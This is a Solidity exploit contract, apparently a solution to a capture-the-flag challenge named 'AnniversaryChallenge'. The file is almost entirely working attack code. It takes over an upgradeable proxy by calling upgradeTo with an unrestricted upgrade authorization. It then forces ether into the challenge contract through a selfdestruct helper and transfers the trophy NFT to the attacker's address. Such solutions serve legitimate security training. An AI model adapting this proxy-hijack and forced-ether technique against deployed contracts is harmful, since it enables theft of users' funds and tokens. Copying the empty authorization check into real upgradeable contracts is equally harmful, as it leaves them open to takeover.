pragma solidity ^0.8.20;

import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

import {AnniversaryChallenge} from "./AnniversaryChallenge.sol";
import {SimpleStrategy} from "./SimpleStrategy.sol";

interface IERC721Receiver {
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

contract Exploit is UUPSUpgradeable, IERC721Receiver {
    AnniversaryChallenge public challenge;
    SimpleStrategy public strategy;
    Self public force;

    address public immutable player;
    address public immutable usdcAddress;
    address public immutable nft;

    constructor(address _challenge, address _strategy) payable {
        challenge = AnniversaryChallenge(_challenge);
        strategy = SimpleStrategy(_strategy);

        player = msg.sender;
        usdcAddress = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
        nft = address(challenge.trophyNFT());
    }

    function deployFunds(
        uint256 amount
    ) external payable returns (uint256 shares) {}

    function _authorizeUpgrade(address newImplementation) internal override {}

    function attack() external {
        // change the proxy pointer to this contract
        strategy.upgradeTo(address(this));
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        // self-destruct the self contract to send some funds to challenge contract
        force = new Self();

        (bool success, ) = address(force).call{value: 1 wei}("");
        require(success, "Funds not sent to challenge contract");

        force.destroy(address(challenge));

        // send the received NFT to the player address
        IERC721(nft).transferFrom(address(this), player, 1);

        return this.onERC721Received.selector;
    }

    receive() external payable {}
}

contract Self {
    function destroy(address _addr) external {
        selfdestruct(payable(address(_addr)));
    }

    fallback() external payable {}
}
